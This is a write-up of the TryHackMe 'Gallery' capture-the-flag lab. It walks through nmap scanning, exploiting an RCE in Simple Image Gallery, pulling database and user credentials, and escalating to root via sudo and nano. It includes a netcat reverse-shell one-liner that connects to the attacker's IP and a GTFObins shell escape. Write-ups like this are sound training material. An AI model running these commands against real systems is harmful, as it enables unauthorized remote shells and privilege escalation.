Let’s take a look at the [Gallery CTF](https://tryhackme.com/room/gallery666) on TryHackMe Created by **@Mikaa**.

## Enumeration
### Nmap Scan
The first step of my enumeration was a scan with **nmap**. by the command:

```
sudo nmap 10.10.22.177 -sC -sS
```
The “Nmap Output” displayed `2` service running under port 80 and 8080.
![Nmap](/images/Gallery/nmap.jpg)

And I've decided to search the http-title of the web application running in 8080: **Simple Image Gallery** and it come out as a *Content management system*.

## Exploiting
Now let’s look for exploits that we can use.

```
searchsploit Simple Image Gallery
```
![SearchSploit](/images/Gallery/searchsploit.jpg)
The Output displayed that there's a **RCE**: Remote Code Execution and a **SQLi**: SQL Injection. And I've decide to go with the RCE vulnerability:
![Exploit](/images/Gallery/exploit.jpg)

So it successfully did a RCE and uploaded a shell on the host. As we open the link that we got, we did see a result of the RCE and I tried **ls** command on it:
![LsAll](/images/Gallery/lsall.jpg)

### Reverse Shell
I set up my netcat listener on port 4444 and I fired up Burp and sent a POST request with the following encoded payload using URL encoding:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.174.180 4444 >/tmp/f
```

**Great!** I received a reverse connection on my port 4444. And I've upgraded the shell with pty module: 
![shellOpen](/images/Gallery/shellOpen.jpg)


## Admin’s Password Hash
Now we're in the machine and I decided to take a look at the `initialize.php` file which gave me the username and the password for accessing the database:
![initial](/images/Gallery/initial.jpg)

Then I tried to connect to the database using the credentials of last file. And I found the **Admin’s Password Hash**:
![insideDB](/images/Gallery/insideDB.jpg)

## User Flag
Inside the home directory of the mike user. I notice a file called `user.txt` but I didn't have the rights to access it. 
![premDenied](/images/Gallery/premDenied.jpg)

As I was exploring I found a directory named `backups` and in it there was a folder with the name `mike_home_backup`. And inside it I looked for the *bash_history* file:
![bashHistory](/images/Gallery/bashHistory.jpg)

**Boom** we found mike's password.

```
su mike
```

Then I found the user.txt file:

```
THM******************
```

## Root Flag
Now it’s time to escalate our privileges and get the root flag. 
![sudoL](/images/Gallery/sudoL.jpg)

So as a result of `sudo -l` we found that there's a file called `/opt/rootkit.sh` which mike was allowed to run as sudo. And it ask for the user input and with the use of the switch cases it delivers:

Lastely I searched for nano on [GTFObins](https://gtfobins.github.io/) and I found this:

```
sudo /bin/bash /opt/rootkit.sh
^R^X
reset; sh 1>&0 2>&0
```

Running the file using sudo, entering the read command to open nano and following the steps of GTFObins helps me escalate to root:
![privEscDone](/images/Gallery/privEscDone.jpg)

Then I found the root.txt file:

```
THM******************
